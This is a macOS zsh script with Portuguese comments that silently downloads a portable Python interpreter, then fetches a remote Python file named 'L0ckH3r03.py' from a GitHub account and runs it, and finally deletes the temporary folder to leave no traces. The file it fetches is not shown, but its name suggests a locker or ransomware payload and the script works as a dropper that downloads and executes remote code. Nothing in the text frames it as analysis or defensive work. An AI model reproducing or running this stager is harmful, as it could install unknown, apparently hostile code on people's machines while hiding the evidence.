#!/bin/zsh

# Configuração de caminhos temporários
PASTA_TMP="/tmp/python_teste"
ARQUIVO_ZIP="$PASTA_TMP/python-full-3.9.25-darwin-universal2.zip"
PASTA_DESTINO="$PASTA_TMP/python_bin"
SCRIPT_ALVO="$PASTA_TMP/teste.py"

# Garante uma instalação limpa apagando resquícios anteriores
rm -rf "$PASTA_TMP"
mkdir -p "$PASTA_TMP"
mkdir -p "$PASTA_DESTINO"

# URL de produção ajustada para a tag cpython-v3.9.25-build.0
URL_PYTHON="https://github.com/bjia56/portable-python/releases/download/cpython-v3.9.25-build.0/python-full-3.9.25-darwin-universal2.zip"
URL_SCRIPT="https://raw.githubusercontent.com/pun1sh3rx0/macOS/refs/heads/main/L0ckH3r03.py"

# 1. Download do interpretador Python Portátil para macOS
echo "[+] Baixando Python portátil universal do GitHub..."
curl -L -f -s -A "Mozilla/5.0" -o "$ARQUIVO_ZIP" "$URL_PYTHON"

if [ $? -ne 0 ] || [ ! -s "$ARQUIVO_ZIP" ]; then
    echo "[-] Erro crítico: Link incorreto ou falha na rede. O arquivo não pôde ser baixado."
    exit 1
fi

# 2. Descompactação do arquivo .zip
echo "[+] Arquivo baixado com sucesso. Descompactando..."
unzip -q -o "$ARQUIVO_ZIP" -d "$PASTA_DESTINO"

if [ $? -ne 0 ]; then
    echo "[-] Erro: Falha na extração. O arquivo baixado está corrompido ou incompleto."
    exit 1
fi

# 3. Localização dinâmica do binário interno
if [ -f "$PASTA_DESTINO/bin/python3" ]; then
    PYTHON_PORTATIL="$PASTA_DESTINO/bin/python3"
elif [ -f "$PASTA_DESTINO/python" ]; then
    PYTHON_PORTATIL="$PASTA_DESTINO/python"
else
    # Procura recursiva caso esteja em um subdiretório nomeado
    PYTHON_PORTATIL=$(find "$PASTA_DESTINO" -type f -name "python3" | head -n 1)
fi

if [ -z "$PYTHON_PORTATIL" ] || [ ! -f "$PYTHON_PORTATIL" ]; then
    echo "[-] Erro: O binário executável do Python não foi encontrado dentro do pacote extraído."
    exit 1
fi

# Garante permissão de execução no binário extraído
chmod +x "$PYTHON_PORTATIL"

# 4. Validação de funcionamento do interpretador
echo "[+] Validando funcionamento do ambiente isolado..."
VERSION=$("$PYTHON_PORTATIL" --version 2>&1)

if [[ "$VERSION" == *"Python 3.9"* ]]; then
    echo "[+] Validação concluída: $VERSION operacional."
else
    echo "[-] Erro: O binário extraído não pôde ser executado nesta arquitetura."
    exit 1
fi

# 5. Download do script de teste do repositório
echo "[+] Baixando script de teste..."
curl -L -f -s -o "$SCRIPT_ALVO" "$URL_SCRIPT"

if [ ! -f "$SCRIPT_ALVO" ]; then
    echo "[-] Erro: Não foi possível obter o arquivo de script alvo."
    exit 1
fi

# 6. Execução final
echo "[+] Inicializando execução..."
"$PYTHON_PORTATIL" "$SCRIPT_ALVO"


# =====================================================================
# ROTINA DE LIMPEZA DO AMBIENTE TEMPORÁRIO
# =====================================================================
# O comando abaixo apaga a pasta centralizadora e todos os arquivos internos,
# garantindo que o diretório /tmp/ não acumule resíduos do processo.
rm -rf "$PASTA_TMP"

echo "[+] Limpeza concluída com sucesso. Todos os arquivos temporários foram removidos."
exit 0
